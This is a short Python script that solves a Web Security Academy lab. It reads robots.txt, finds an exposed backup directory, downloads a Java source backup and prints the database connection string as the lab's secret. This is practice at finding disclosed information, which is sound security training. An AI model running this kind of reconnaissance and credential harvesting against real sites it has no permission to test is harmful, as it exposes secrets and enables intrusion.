import requests

'''

Coded by Kamran Saifullah
https://linkedin.com/in/KamranSaifullah
https://twitter.com/deFr0ggy
https://github.com/deFr0ggy

'''

proxxy = {

    "http" : "https://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080"

}

URL = "https://0a2800af042041c88021b702002d004e.web-security-academy.net/robots.txt"
r = requests.get(URL, verify=True)

try:
    if r.status_code == 200:
        
        # Part 1 to Find the Backups PATH

        print(f"[+] URL is accessible: {URL}")
        print(f"[+] Robots.txt - Backup Directory: \n\n{r.text}")
        
        # Part 2 to find the Backup File

        URL1 = "https://0a2800af042041c88021b702002d004e.web-security-academy.net/backup"
        r = requests.get(URL1)
        
        if r.status_code == 200: 
            print(f"[+] URL Working: {URL1}")
            print(f"[+] Backups PATH Observed at Offset: {r.text.find('bak')}")
            print(f"[+] Backup PATH: {r.text[310:310+34]}")

        # Part 3 to find the SECRET in source code  

            URL2 = "https://0a2800af042041c88021b702002d004e.web-security-academy.net/backup/ProductTemplate.java.bak"
            r = requests.get(URL2)
            print(f"[+] URL Working: {URL2}")
            print(f"[+] Connection String at Offset: {r.text.find('withAutoCommit')}")

            print(f"[-] Lab Completed : {r.text[920:920+54]}")

        else:
               print("Something Went Wrong")

except:
    print("Something went wrong!")

